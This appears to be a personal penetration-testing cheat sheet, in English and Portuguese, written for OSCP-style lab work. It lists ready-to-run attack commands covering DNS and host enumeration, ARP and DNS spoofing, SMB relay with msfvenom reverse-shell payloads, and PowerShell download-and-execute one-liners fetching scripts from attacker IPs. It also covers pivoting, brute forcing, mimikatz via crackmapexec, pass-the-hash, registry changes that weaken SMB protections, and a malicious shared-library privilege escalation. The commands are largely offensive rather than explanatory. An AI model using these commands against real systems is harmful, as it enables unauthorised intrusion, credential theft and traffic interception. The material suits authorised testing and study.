#Pandoc - I generate my reports with pandoc from a markdown file
	pandoc /Users/kali/Documents/HD_KALI/TEMP/Teste/Report_OSCP_1.md  -o /Users/kali/Documents/HD_KALI/TEMP/Teste/Report_OSCP_teste.pdf  --from markdown+yaml_metadata_block --table-of-contents --toc-depth 2 --highlight-style breezedark --number-sections --top-level-division=chapter --template eisvogel

# Fixing Problems with XFCE that normally occurs with Kali 
	rm -rf .cache/ .config/ .local/ && sync && reboot

# Mouting VMWare's share
	echo '.host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0' >> /etc/fstab

#Linux's route

	ip route show
	route -n 
	traceroute 10.86.74.10 -m 5 

	#Add route through a known gateway
	sudo ip route add 10.86.74.0/24 via 192.168.193.85 dev tap0

#DNS 
	whois elsfoo.com -h whois.godaddy.com
	dnsenum -dnsserver 10.50.96.15 -enum intranet.foocampus.com 
	dig @172.16.5.10 -x 172.16.5.10 +nocookie
	dig -t NS DOMAIN_NAME
	dig _gc. DOMAIN_NAME
	#Zone transfer with DIG
		dig @nameserver axfr mydomain.com
		dig @10.50.96.15 foocampus.com -t AXFR 
		dig @10.50.96.15 foocampus.com -t AXFR +nocookie
	#Email Sending Basics – PTX
		#verify SPF - Sender Policy Framework 
			dig +short TXT microsoft.com 
		#Check public key of a mail server - DKIM 
			dig selector._domainkey.domain.com TXT
			dig dkim._domainkey.twitter.com TXT
		#verify DMARC 
			dig +short TXT _dmarc.wordpress.com
			dig +short TXT _dmarc.DOMAIN.com


	#Zone transfer with HOST
		host -t axfr foocampus.com 10.50.96.5

	#Subdomain enumeration 
	dnsmap elsfoo.com
	dnsrecon -d elsfoo.com
	dnsrecon -d elsfoo.com -t axfr 
	fierce --domain elsfoo.com --dns-server 172.16.5.10
	fierce --range 172.16.64.0/24 --dns-server 172.16.64.92
	amass enum -cidr 172.16.64.0/24 -d 172.16.64.92
	amass enum -cidr 189.125.212.0/25,177.223.195.0/24,186.211.143.0/25,189.125.78.0/25,200.208.28.0/24,177.223.197.0/24 -d bndes.gov.br
	function am {
	    amass enum -json $1.json -d $1
	    jq .name $1.json | sed "s/\"//g"| httprobe -c 60 | tee -a $1-domains.txt
	}

	for name in $(cat /usr/share/fierce/hosts.txt); do host $name.sportsfoo.com 172.16.5.10 -W 2; done | grep 'has address'

	#NSLOOKUP
	nslookup -type=PTR elsfoo.com
	nslookup -type=ANY elsfoo.com
	nslookup -type=PTR 10.10.10.44		#Reverse Lookup
	nslookup
		> set q=NS
		> foocampus.com
		> set q=MX
		> foocampus.com
		> set q=AXFR
		> foocampus.com

	nslookup -type=NS mydomain.com 
	nslookup
		> server [NAMESERVER FOR mydomain.com]
		> ls –d mydomain.com

	#Discover the Domain Controller with NSLOOKUP
		nslookup
			> set type=all
			> _ldap._tcp.dc._msdcs.NOMEDODOMNIO
	#Enumerate network with Nslookup and Nbtstat on windows
		C:\ > for /L %i in (1,1,255) do @nslookup 10.10.10.%i [server to resolve from] 2>nul | find "Name" && echo 10.10.10.%i
		C:\ > for /L %i in (1,1,255) do @nbtstat -A 10.10.10.%i 2>nul && echo 10.10.10.%i
 
	#Discover the name of an authoritative DNS from IP
		nano /etc/rosolv.conf
		nslookup 172.16.5.10

	#Discover the Domain name 
		#1 - Use nslookup passing the dns server ip and querying an ip
			> server <IP DO DNS> #server 172.16.5.10
			> <IP DE UM HOST> # 172.16.5.5 
		#2 - Fierce - checks the ip range
		fierce --range 172.16.64.0/24 --dns-server 172.16.64.92
		#3 - DIG 
		dig @172.16.5.10 -x 172.16.5.5 +nocookie

#Host Discovery  - Try different ways to scan the test
	#Ping or ARP
		netdiscover -i tap0 -r 10.10.10.0/24
		fping -a -g 10.50.96.0/23
		sudo nmap -n -sn 172.16.50.0/24 #Ping sweep  
		sudo nmap -n -sn --disable-arp-ping 10.50.96.0/23 #option to disable "arp-ping"
		sudo nmap -PE -sn -n 172.16.64.0/24 -oX - | uphosts -oX

	#No ping [UDP or TCP scan]
		sudo nmap -sn -PU -n 10.50.96.0/23 
		sudo nmap -sn -PU139 -n 10.50.96.0/23 #UDP scan 
		sudo nmap -sn -PS -n 10.50.96.0/23
		sudo nmap -sn -PS22,135,443,80,445 -n 10.50.96.0/23 #TCP scan 

	#Reverse DNS with nmap - List ips
		sudo nmap -sL 10.50.96.0/24

	# Powershell 
		powershell iex (New-Object Net.Webclient).DownloadString('http://192.168.45.228/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 172.16.227.0/24 -T 4 -TopPorts 25 -oA localnet

#Port Scan
	#Hping
		sudo hping3 -S -c 3 --scan 1-1000 10.50.97.5
	#NMAP
		#Nmap in only two ips 
			sudo nmap -n -Pn 10.10.10.5,20

		#IDLESCAN
			#find the zumbi
				sudo nmap -O -v -n -Pn --disable-arp-ping 127.0.0.1
				sudo nmap --script ipidseq 127.0.0.1
				hping3 -S -r -p [port] [IP_Address]
			#do the Idle Scan 
				sudo nmap -sI 10.0.0.2:22 127.0.0.1 -n -Pn --disable-arp-ping --packet-trace
				hping3 -a [ZombieIP] -S -p [TargetPort] [TargetIPaddress]

		#IPS IDS EVASION
			sudo nmap -sS -f 127.0.0.1
			nmap -sS -D 192.168.1.15,ME,192.168.1.20 [ALVO]
		
		#other examples
			nmap -F 192.168.29.144
			nmap -T4 -p445 --script vuln 192.168.29.132
			nmap -p22,80,111,139,445,53621,60867 -n -Pn -A -o nmap_2_A_.txt 192.168.29.144
			sudo nmap -sU -sS --script smb-enum* -p U:137,T:139,T:445 --script-args smbuser=administrator,smbpass=password -n -Pn 10.130.40.70 
			proxychains nmap -Pn -sTV -p- -T5 192.168.232.6
   			proxychains nmap -Pn -sT -p- -T5 192.168.232.6
    		searchsploit -x --nmap result.xml

    	#PortScan with NC 
    		nc -w 1 -z -v 10.185.10.7 1-10000

    	#another way 
    		for PORT in {1..1000}; do timeout 1 bash -c "</dev/tcp/10.185.10.27/$PORT &>/dev/null" &&  echo "port $PORT is open" ; done 

    	#Powershell and Powesploit
    		powershell iex (New-Object Net.Webclient).DownloadString('http://192.168.45.228/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 172.16.227.0/24 -T 4 -TopPorts 25 -oA localnet
    		powershell iex (New-Object Net.Webclient).DownloadString('http://foophonesels.com:5923/tmp/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts "10.185.10.55" -ports "42400-42500"
			

#NetWork -Password Sniffer and Man in the Middle
	#RESPONDER and MULTIRELAY 
		#LLMNR e NBT-NS poisoning SMB Singing must be false 
		#Turn Off for SMB and HTTP in Responder.conf
			python RunFinger.py -i <target IP> #Check which IPS have False Signing
			sudo responder --lm -I eth0 #If run without MultiRelay it captures the NTLMv1 Hash
			python MultiRelay.py -t <target IP> –u ALL 
		
		#RESPONDER + SMBRELAY with IMPACKET
			#Prepare the payload
			msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=172.16.23.10 lport=8080 -f exe -o reverse-smb.exe
				#use AUTO MIGRATE
				set InitialAutoRunScript post/windows/manage/migrate
				#or 
				set AutoRunScript migrate -n svchost.exe 
			#Impacket script that will inject the payload into the victim
			sudo smbrelayx.py -h 172.16.23.101 -e reverse-smb.exe
			#For smbrelayx it must be provoked with SMB poisoning
			python Responder.py -I eth0 --lm

		#Metasploit has a module for SMB Relay
		> use exploit/windows/smb/smb_relay
		> set SHARE {UM COMPARTILHAMENTO COM OPÇÃO DE ESCRITA}
		> set SMBHOST {o alvo onde se tentará conectar com as credenciais obtidas}

	#Mac Flooding - Attacks the switch with fake MAC addresses so that the switch acts as a HUB and redirects all traffic
		echo 1 > /proc/sys/net/ipv4/ip_forward
		sudo macof -i eth0 
	#ArpSpoof - Made for both communication nodes
		#Preparation: enable ip_forward
			echo 1 > /proc/sys/net/ipv4/ip_forward
			#or
			sudo sysctl -w net.ipv4.ip_forward=1
		sudo arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.15
		sudo arpspoof -i tap0 -t 172.16.5.15 -r 172.16.5.1
		#Opt for Ettercap - older but in the Lab it proved to be more stable
		#Search for images in traffic
			sudo driftnet -i tap0e
		##Search for urls in traffic
			sudo urlsnarf -i tap0
		#Password Sniffer
			sudo python /mnt/hgfs/HD_KALI/TOOLs/Git_Repository/net-creds/net-creds.py
			sudo python /mnt/hgfs/HD_KALI/TOOLs/Git_Repository/net-creds/net-creds.py -p arquivo.pcap
			sudo dsniff -i tap0  
			sudo dsniff -p arquivo.pcap
		#BETTERCAP
			sudo docker pull bettercap/bettercap
			sudo docker run -it --privileged --net=host bettercap/bettercap -iface tap0
				>> net.recon on 
				>> net.probe on 
				>> net.show
		#DNSSPOOF
			echo "172.16.5.150 *.sportsfoo.com" > dns.txt
			echo "172.16.5.150 mail.*" >> dns.txt 
			sudo dnsspoof -i tap0 -f dns.txt
			#SMB_RELAY attacks together with DNSSpoof must be done together with ARPSpoof

		#ICMP Redirect - SCAPY
			#https://ivanitlearning.wordpress.com/2019/05/20/icmp-redirect-attacks-with-scapy/comment-page-1/
			echo 1 > /proc/sys/net/ipv4/ip_forward
			iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE
			iptables -t nat -L

			scapy
				# Creating and sending ICMP redirect packets 
				originalRouterIP='<The router IP address>' 
				attackerIP='<Your VPN IP Address>' 
				victimIP='<The Victim IP Address>' 
				serverIP='<The Web Server IP Address>'
				# We create an ICMP Redirect packet
				ip=IP()
				ip.src=originalRouterIP
				ip.dst=victimIP
				icmpRedirect=ICMP()
				icmpRedirect.type=5
				icmpRedirect.code=1
				icmpRedirect.gw=attackerIP
				# The ICMP packet payload /should/ contain the original TCP SYN packet # sent from the victimIP
				redirPayloadIP=IP()
				redirPayloadIP.src=victimIP
				redirPayloadIP.dst=serverIP
				fakeOriginalTCPSYN=TCP()
				fakeOriginalTCPSYN.flags="S"
				fakeOriginalTCPSYN.dport=80 
				fakeOriginalTCPSYN.seq=444444444 
				fakeOriginalTCPSYN.sport=55555
				while True: 
					send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
				# Press <enter>


########################    PIVOT   ########################
https://www.thehacker.recipes/sys/pivoting/socks-proxy
	#PIVOT with Metasploit
		##Add route with autoRoute
		#OUTDATED!!!!
		meterpreter > run autoroute -s 10.100.40.0/24
		meterpreter > background
		#Updated!!! If necessary, set the network mask as well
		msf6 > use post/multi/manage/autoroute
		msf6 post(multi/manage/autoroute) > set session 1
		msf6 post(multi/manage/autoroute) > set subnet 10.100.40.0
		#Third option with the direct route from the console
		#ROUTE ADD IP/MASK SESSION
		msf6 > route add 10.10.50.0/20 2

		#Port forwarding - Way to interact with pivot nº1
			meterpreter > portfwd add -L 172.16.23.10 -l 9999 -p 445 -r 10.100.40.100
			meterpreter > portfwd add -L 172.16.23.10 -R -l 4444 -p 4444
			#When using a metasploit module, the "cat's leap" is to use the attacker's IP and the port listening in the redirection as rhost;
			#and in the lhost the Pivot IP and the autoroute takes care of the rest
			##Or use a bind payload 
		#Proxy 
			msf6 > use auxiliary/server/socks_proxy
			msf6 auxiliary(server/socks_proxy) > set srvport 9090
			#Outside Metasploit execute commands with proxychains 
			#No metasploit: When selecting your exploit, normally place your target in RHOST and your interface in LHOST
			msf6 > set Proxies socks5:127.0.0.1:9090
			msf6 > set reverseallowproxy true
			msf6 > exploit
			#####OBS#####
			#If the exploit is directly through metasploit, with an active meterpreter session, there is no need to set the proxy, just select the round trip routes in auto route
		
		#PORTProxy
			#If it is necessary to pivot from a target with more than one network interface where the second target has no route to the attacker
			#Use the portproxy module to create a redirection table on the target where there is a meterpreter session
			#Example: I needed to run a powershell script in memory that was in the attacker on a third machine that does not have a route for me
			#So PortProxy was used to redirect everything that the third element sent to a certain pivot port to my port 80
			msf > use post/windows/manage/portproxy
			msf > set CONNECT_ADDRESS IP_DO_ATACANTE
			msf > set CONNECT_PORT PORTA_DO_ATACANTE
			msf > set LOCAL_ADDRESS IP_LOCAL_DO_ALVO
			msf > set LOCAL_PORT PORTA_LOCAL_DO_ALVO
			msf > set SESSION 1 
			msf > run 
			#If it is to be used in an attack: in RHOST goes the desired target on the internal network, in LHOST the EXTERNAL IP of the PIVOT and LPORT that was used in PORTSPROXY which redirected it from an INTERNAL_IP to a port on the Attacker's IP
	
	#PIVOT com SSH
		https://hackertarget.com/ssh-examples-tunnels/
		#Proxy
		ssh -N -v -D 9090 root@10.10.10.10
		#Proxy Jump - Through "jump host" or "bastion host"
		ssh -i key.txt -N -v -D 9090 -J user@10.10.10.10 root@10.10.51.20 -p 5811
		ssh -J username@host1:port,username@host2:port username@host3:port
		#Portforward Local - Opens a port on the attacker
		ssh  -L 9999:127.0.0.1:80 user@remoteserver #Redireciona a porta 80 do remoteserver para 9999 local do atacante
		ssh  -L 0.0.0.0:9999:127.0.0.1:80 user@remoteserver
			#SSH Tunnel Forward to Secondary Remote host
				#Here, we redirect to local port 9999 the port 80 of another host to which the remote server has access
				ssh  -L 0.0.0.0:9999:10.10.10.10:80 user@remoteserver 
		#Portfoward Reverse - Opens a port on the target
		ssh -R 43022:localhost:22 dave@sulaco.local #Redirect target port 22 to Target port 43022
		ssh -v -R 0.0.0.0:1999:127.0.0.1:902 192.168.1.100 user@remoteserver

	#Pivot with Plink - Scenario: Target Windows calling Kali
	#Path NORMALLY reversed to that used in ssh, here TARGET => ATTACKER
		#PortFoward Destination:Origin - 10.10.14.15 (attacker), 10.10.10.198 (target)
			#Remote - Redirects port localhost:8888 (Target) to localhost:65000 (Attacker)
			plink.exe 10.10.14.15 -P 22 -C -x -a -R 65000:127.0.0.1:8888
			cmd.exe /c echo y | plink.exe -ssh -l cassio -pw "blablabla" -R IP_KALI:1234:127.0.0.1:3306 IP_KALI
			plink2.exe cassio@192.168.119.237 -pw "blablabla" -batch -P 22 -C -x -a -R 65000:127.0.0.1:445
			#Local - Redireciona a porta localhost:8888 (Do Alvo) para a porta externa 10.10.10.198:65000 (também alvo)
			plink.exe 10.10.14.15 -P 22 -C -x -a -L 10.10.10.198:65000:127.0.0.1:8888
		#Socks proxy
		plink.exe {Box 2} -P 22 -C -L 127.0.0.1:444:{Box 3}:3389 -l username -pw password
		# Connects to 192.168.1.2 on port 5900. Sets up a SOCKS proxy that listens on 127.0.0.1 port 9876 and forwards all connections through the connection to 192.168.1.2.
		# You then need to configure your system to use 127.0.0.1:9876 as a SOCKS proxy.
		putty\PLINK.EXE 192.168.1.2 -P 5900 -D 127.0.0.1:9876 -N
	
	
	# Pivot - cenário PWK - shell com www-data no servidor conectando no kali 
		# Executado no ALVO_1 para que abra uma porta no Kali 
		ssh -f -N -R 1122:<IP_ALVO_2>:22 -R 13306:<IP_ALVO_2>:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" cassio@192.168.119.21 -i /tmp/keys/id_rsa
		ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" cassio@192.168.119.21 -i /tmp/keys/id_rsa
		# Se colocar uma chave no alvo para nao ter prompt de senha, colocar as seguintes restricoes no authorized_keys
			#No Alvo
			cd /tmp
			mdkir keys
			ssh-keygen 
				/tmp/keys/id_rsa
			# No Kali 
			cat authorized_keys
				from="10.11.1.250",command="echo 'This account can onlybe used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa naosdnoiadisdoisaoidoiasdnsan... www-data@hostname

		# NMAP 
			proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
	
	# RINETD 
		# Cenario: KAli com coneccao internet e alvo nao 
		└─$ sudo nano /etc/rinetd.conf
				# bindadress  bindport  connectaddress  connectport  options...
				0.0.0.0 80 91.189.91.38 80
		└─$ sudo service rinetd restart
		# No alvo, adicionar no /etc/hosts o kali com o nome do local a ser acessado
				
		
############################################################

#Enumeração da rede 
	#Ping_Sweep e ArpScan não precisam de proxy nem route [Rodam do Próprio aLvo]
	msf > use post/multi/gather/ping_sweep 
	msf > use post/windows/gather/arp_scanner 
	msf > hosts -R #joga os hosts do workspace para o RHOSTS

	#Caso em Servidor - Sniffar suas interfaces para mais informações de usuários
	meterpreter > use sniffer
	meterpreter > sniffer_interfaces
	meterpreter > sniffer_start 2
	meterpreter > sniffer_dump 2  /tmp/output.pcap
	meterpreter > sniffer_stop 2

#NFS - 2049
	msf > use scanner/nfs/nfsmount 
	showmount -e 172.16.80.27
	sudo nmap -n -Pn --script nfs-* 172.16.80.27
	sudo mount -t nfs -o vers=2 172.16.80.27:/home/simon /tmp/simon -o noclock

#SMTP - Validar usuário RCPT VRFY EXPN - https://github.com/insidetrust/statistically-likely-usernames
	nmap --script smtp-commands -n -Pn 172.16.80.27
	smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 172.16.80.27
	msf > use auxiliary/scanner/smtp/smtp_enum
	sudo mount -t nfs -o vers=2 172.16.80.27:/home/simon /tmp/simon -o noclock #Tentar com e sem o noclock e vers= 

#SAMBA/SMB e NetBios 
	https://book.hacktricks.xyz/pentesting/pentesting-smb
	https://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios
	#137,138,139 - NetBios
		nmblookup -A 10.130.40.70
		nbtscan <IP>/30
		sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP>
		nbtscan -r 192.168.0.1/24

	#MONTAR COMPARTILHAMENTOS
		#Windows
			fsutil fsinfo drives #verificar volumes montados
			net view 192.168.99.162
			net use K: \\192.168.99.162\C
			#Com senha
			net use \\192.168.99.162\IPC$ "" /u:""
			net use e: \\ip\ipc$ password /user:domain\username
		#Linux
			sudo mount.cifs //192.168.99.162/C /media/K_share/ user=,pass=
			sudo mount -t cifs -o user=admin,pass='et1@sR7!',rw,vers=1.0 //172.16.5.10/finance /tmp/finance/ 

		#Criar compartilhamento SMB kali 
			impacket-smbserver share /root/compart

			net use * \\<IP_Kali>\share

	#NetBIOS e SMB
		
		rpcdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address]
		rpcclient -N -U "" 10.10.10.20 
		rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash

		#RPCclient iterando sobre lista de ips
			cat ips.txt | while read line
			do
				echo $line && rpcclient -U "ELS\Usuario%Senha" -c "enumdomusers;quit" $line
			done

			#Recomendada a atenção aos comandos do rpcclient
				enumalsgroups
				srvinfo
				lookupnames
				queryuser
				enumprivs


		enum4linux -a 10.10.10.20
		#Enum4linux recebe usuário e senha, que DEVEM ser passados antes do IP, se passados ao final ele não os utiliza
		enum4linux -a -u local_admin -p 'P@ssw0rd123' 172.16.80.100 

		#crackmapexec - cme 
		https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/

			crackmapexec smb 172.16.80.27 -u '' -p '' -d ROBOTSTOGO --shares
			crackmapexec smb 172.16.5.10 -u /tmp/users.txt -p /tmp/pass.txt # para fazer força bruta com o cme deve-se colocar o target antes dos arquivos
			crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares 

			crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!' --sam

			 --ntds vss
			 --lsa 
			 --ntds-pwdLastSet
			 --ntds-history

			sudo crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!' -M enum_chrome
			crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!' -M enum_avproducts
			crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!'  --rid-brute
			sudo crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!' --local-auth -M mimikatz  #rodar como sudo para enviar o mimikatz
			sudo crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!' --local-auth -M mimikatz -o COMMAND='privilege::debug'

			
			#No metermetreter, usar web_delivery com TARGET 2 (PSH), e payload windows/meterpreter/reverse_https, RAND é o URIPATH 
			sudo crackmapexec smb 172.16.5.10 -u admin -p 'et1@sR7!' -M met_inject -o SRVHOST=172.16.5.100 SRVPORT=8080 RAND=pApcwQcXUOXG0


		smbclient -L 10.130.40.70 -N
		smbclient -L //10.10.10.3/ --option='client min protocol=NT1'
		smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>
		smbclient \\\\192.168.193.211\\C -N

		smbmap -H 172.16.5.10 -u almir -p 'Corinthians2012' 
		smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
		smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>]

		#NMAP + Samba
			#Força Bruta com NMAP em SMB 
				nmap -p445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
			#Uma vez com senha ou login anonimo Nmap pode enumerar SMB
				sudo nmap -sU -sS --script smb-enum* -p U:137,T:139,T:445 --script-args smbuser=administrator,smbpass=password -n -Pn 10.130.40.70

	#Força Bruta em SMB com smb_login
		msf6 auxiliary(scanner/smb/smb_login) > run

	#Executar Comandos 
		https://www.hackingarticles.in/remote-code-execution-using-impacket/ 
		#Execuão Remota com Impacket
			#Psexec
				./psexec.py [[domain/]username[:password]@]<targetName or address>
				./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
				psexec \\192.168.122.66 -u Administrator -p 123456Ww
				psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
			#SMBexec
				smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100
			#WMIexec
				python wmiexec.py ignite/administrator:Ignite@987@192.168.1.105 dir
			#AtExec - tentativa através do AT-Scheduler Service
				python atexec.py ignite/administrator:Ignite@987@192.168.1.105 systeminfo

		#CrackmapEXEC
			crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
			crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
			crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash

		#PTHWINEXE
			pth-winexe -U els-Win7/administrator%password //10.130.40.70 cmd
			pth-winexe -U WORKGROUP/admin%db170c426eae78beff17365faf1ffe89:482563f0adaac6ca60c960c0199559d2 //10.10.10.20 cmd

		#Caso os Ataques de Pass The Hash não funcionem mesmo se tendo um hash de um usuário do grupo dos Administradores, deve -se mudar o valor de dois registros no windows
			PS> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System - Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
			PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters – Name RequireSecuritySignature –Value 0 –Type DWord
			#ou
			C:\> reg add “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
			C:\> reg ad

#Micorsoft SQL Server 1433 
	nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 172.16.64.199
	msf> use auxiliary/scanner/mssql/mssql_ping

	msf> use exploit/windows/mssql/mssql_payload

#SNMP - UDP 161,162,10161,10162
	#Descobrir os Community Names é o primeiro passo
		sudo nmap -n -Pn -p 161,162,10161,10162 -g 161 -sU --script="snmp* and not snmp-brute" 10.10.10.5
		sudo nmap -sU -p 161 192.168.102.149 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt
		onesixtyone -c  /usr/share/seclists/Discovery/SNMP/snmp.txt -w 100 10.10.10.5
	#De posse dos nomes realizar querys para obter informações como lista de usuários 
	/usr/share/snmpenum/snmpenum.pl 10.10.10.5 <COMMUNITY NAME> /usr/share/snmpenum/windows.txt
	/usr/share/snmpenum/snmpenum.pl 10.11.1.115 public /usr/share/snmpenum/linux.txt
	snmpenum 10.10.10.5 private windows.txt
	snmpwalk -v 2c -c <COMMUNITY NAME> 10.10.10.5
	snmpcheck.pl -c COMMUNITY_STRING -t IP 

#Força Bruta e Wordlists
	/usr/share/seclists/Usernames/Names/names.txt
	/usr/share/wordlists/statistically-likely-usernames/facebook-base-lists/john-x10000.txt
	/usr/share/seclists/Usernames/top_shortlist.txt

	#BRUTE FORCE
		#NCRACK - Nao mantido mais - substituido pelos scripts do nmap - possui falsos positivos
		ncrak -vv -U user.txt -P pass.txt 192.168.16.12 -p telnet 
		#MEDUSA - suporta mais protocolos que nmap
		medusa -h 192.168.16.12 -M telnet -U user.txt -P pass.txt
		#HYDRA
		hydra -e nsr -L user.txt -P pass.txt ssh://192.168.16.12
		hydra -L usernames.txt -P passwords.txt -f -e nsr -o hydra.txt -t 4 ssh://192.168.56.103
		hydra -L /usr/share/seclists/Usernames/Names/names.txt -p CHANGEME -f -e nsr -t 4 ssh://172.16.64.166:2222
		hydra -l jan -P 10k-most-common.txt 192.168.43.170 ssh
		hydra -l root -P 10k-most-common.txt 192.168.56.103 mysql
		hydra -L user.txt -P pass.txt 192.168.1.118 smb
		hydra -l admin -P /mnt/hgfs/Downloads/ctf/10k_comom.txt -e nsr 192.168.29.143 http-post-form "/secret/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Location"
	 	hydra -l admin -P /usr/share/john/password.lst -V smb://10.10.10.20:445 -f
		#Hydra - HTTPS BASIC AUTH
		hydra -L user.txt -P /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt -e nsr -s 443 -f 172.12.80.124 https-get / -v -f
		
		#PATATOR - Não conhecia - Aparentemente não tão user friendelly mas permite uma melhor flexibilidade
		patator ssh_login host=FILE0 user=FILE1 password=FILE2 0=hosts.txt 1=logins.txt 2=pwd.txt -x ignore:mesg='Authentication failed.'
		patator telnet_login host=192.168.16.12 inputs="FILE0\nFILE1" 0=user.txt 1= pass.txt -x ignore:mesg!="Tue Feb 9 04:"
		patator http_fuzz url=http://elsfoo.com/login.php method=POST body='username=FILE0&password=FILE1&lang=en' 0=users.txt 1=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Invalid Username'
		patator http_fuzz url=http://elsfoo.com/login.php method=POST body='username=FILE0&password=FILE1&lang=en' 0=users.txt 1=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='wrong_user'
		patator http_fuzz 'url=http://1.lab.auth.site/ajax.php?username=FILE0&password=tantofaz&lang=en' method=GET 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt  follow=1 accept_cookie=1 -x ignore:fgrep='invalid user'
		patator http_fuzz url='http://3.challenge.auth.site/login.php' method=POST body='username=FILE0&password=admin' 0=/usr/share/seclists/Usernames/Names/names.txt  header='Referer: http://3.challenge.auth.site/login.php\r\nCookie: PHPSESSID=oivfdb1kuaosc3e9nhtb58src3' follow=1 accept_cookie=1 -x ignore:fgrep='Invalid username' -R /tmp/printt.txt
		patator http_fuzz url='http://4.challenge.auth.site/checkUser.php' method=POST body='username=FILE0' 0=/usr/share/seclists/Usernames/Names/names.txt  header='Referer: http://4.challenge.auth.site/register.php' follow=1 accept_cookie=1 -x ignore:egrep="^1" -x ignore:fgrep=302
	
	#Wordlists
		#RSMANGLER - Manipulação de WordList - Do mesmo autor do Cewl
		cat words.txt | rsmangler --file - > words_new.txt
		#CEWL - Varre websites e cria wordlist 
		cewl -m 4 http://www.google.com -w passwords.txt
		#Crunch
		crunch 2 3 -o  /tmp/rolha.txt
		crunch 8 8 -t k1ll0r%@ -o dict.txt
		#MP64
		mp64 "k1ll0r?a?a" >> dict2.txt

#Crack de senhas

	/usr/share/john/password.lst
	/usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt
	/usr/share/wordlists/fasttrack.txt
	/usr/share/seclists/Passwords/best15.txt

	#Crack NetLm Hash - Network Hash 
		#Metasploit para Capturar o hash através de um SMB Relay ou Fake SMB
			> use auxiliary/server/capture/smb
			> set JOHNPWFILE arquivo_para_john.txt
		#John 
			john --format=netlm hashpwd_netntlm


		#ou#

		#rcrack
		rcracki_mt -h 1f548398f0f49ea1 -t 4 *.rti
		#Esse crack acima só quebrou parte do hash, caso a senha seja maior que 8 char deve-se quebrar o restante do hash, um script ruby do metasploit recebe o hahs todo e a parte quebrada para decifrar tudo 
		ruby halflm_second.rb -n 1f548398f0f49ea18e2f0dcb9562b75eaa32e75aebf1d69c -p ELSPWD1
		#A senha retorna sempre toda em maiúsculo para decifrar a correta há script perl na pasta do john que se encarrega de encontrar a forma correta
		perl netntlm.pl --file arquivo_para_john.txt --seed ELSPWD123

	#John
		unshadow /etc/passwd /etc/shadow > arquivo

		john sam.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
		john sam.txt --format=LM --wordlist=/usr/share/wordlists/rockyou.txt
		john --show sam.txt --format=NT

		ssh2john id_rsa > crack.txt
		john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt crack.txt

# Tomcat default Creds https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
	msf > use auxiliary/scanner/http/tomcat_mgr_login

#PRIVESC - LINUX
	#Execucao de codigo via Shared Object Library - PRIVESC LINUX
		ldd /usr/local/bin/program #Verifica quais bibliotecas são carregadas
		#Verificar se o binário foi compilado com RPATH ou RUNPATH para inseririr a biblioteca maliciosa 
		objdump -x /usr/local/bin/program |grep RPATH
		objdump -x /usr/local/bin/program |grep RUNPATH
		msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.45.208 LPORT=443 -f elf-so -o program.so
		cd /tmp/program/libs && wget http://attacker_ip/program.so

